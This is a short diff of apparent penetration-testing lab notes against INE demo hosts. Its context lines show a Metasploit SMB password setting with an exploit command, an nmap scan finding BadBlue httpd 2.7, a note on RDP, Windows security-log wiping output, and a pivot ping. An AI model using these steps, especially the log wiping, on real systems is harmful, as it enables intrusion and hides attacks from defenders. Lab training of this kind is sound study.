@@ -165,7 +165,6 @@
 		set SMBPass qwertyuiop
 		exploit
 ## Window: Enabling Remote Desktop
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	nmap -sV -sC demo.ine.local
 		80/tcp    open  http         BadBlue httpd 2.7
 	RDP 預設連接埠未公開 - 3389
@@ -211,7 +210,6 @@
 		[*] Wiping 15902 records from Security...
 
 ## Pivoting
-	~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	ping demo2.ine.local
 	PING demo2.ine.local (10.0.31.80) 56(84) bytes of data.
 
